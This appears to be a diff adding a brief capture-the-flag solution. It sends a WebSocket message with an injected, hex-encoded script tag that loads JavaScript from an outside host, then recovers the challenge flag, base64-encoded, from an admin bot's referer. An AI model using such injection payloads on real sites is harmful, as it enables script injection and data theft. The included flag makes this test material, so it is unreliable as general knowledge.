@@ -1,0 +1,6 @@
+In JS console:
+var ws = new window.WebSocket('ws://' + location.host + '/ws');
+ws.send("html: msg'), (0x3c736372697074207372633d2268747470733a2f2f727a686f752e6f72672f7e7269636b792f7873732e6a73223e3c2f7363726970743e), ('3")
+
+Receive connection with referer: http://127.0.0.1:9991/review?pass=QkNURnt4c3NfaXNfbm90X3RoYXRfZGlmZmljdWx0X3JpZ2h0fQ==&id=17512
+base64 decode, get flag.
